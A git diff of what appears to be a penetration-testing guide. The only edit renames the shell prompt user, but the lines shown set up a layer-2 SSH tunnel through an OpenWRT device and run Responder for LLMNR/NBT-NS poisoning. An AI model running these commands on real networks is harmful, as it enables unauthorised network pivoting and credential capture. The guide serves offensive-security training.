@@ -98,7 +98,7 @@ C:\openwrt\wrt_vbox_deploy.bat
 For the script to work correctly, it must be processed for execution in the ASH shell. You need to send this ASH script to OpenWRT somehow, I don't think you'll have a problem with that. You can even use `vsftpd` for that.
 
 ```bash
-cursed@kali:~$ ssh root@<OpenWRT IP>
+caster@kali:~$ ssh root@<OpenWRT IP>
 ```
 
 ```
@@ -114,14 +114,14 @@ You don't have to worry about silence on the OpenWRT side. It doesn't make noise
 It is also important to create a /32 route to the OpenWRT endpoint before initiating the SSH tunnel to avoid disconnecting the connection
 
 ```bash
-cursed@kali:~$ sudo route add -net <openwrt_ip> netmask 255.255.255.255 gw <gw_ip>
+caster@kali:~$ sudo route add -net <openwrt_ip> netmask 255.255.255.255 gw <gw_ip>
 ```
 
 ```bash
-cursed@kali:~$ sudo ssh -oHostKeyAlgorithms=+ssh-rsa -oTunnel=ethernet -w 0:0 root@<OpenWRT IP>
-cursed@kali:~$ sudo ip link set tap0 up
-cursed@kali:~$ sudo dhclient -v tap0; sudo route del default
-cursed@kali:~$ sudo responder -I tap0 -vvv
+caster@kali:~$ sudo ssh -oHostKeyAlgorithms=+ssh-rsa -oTunnel=ethernet -w 0:0 root@<OpenWRT IP>
+caster@kali:~$ sudo ip link set tap0 up
+caster@kali:~$ sudo dhclient -v tap0; sudo route del default
+caster@kali:~$ sudo responder -I tap0 -vvv
 ```
 
 # Proof of Concept (LLMNR/NBT-NS Poisoning, Scanning)
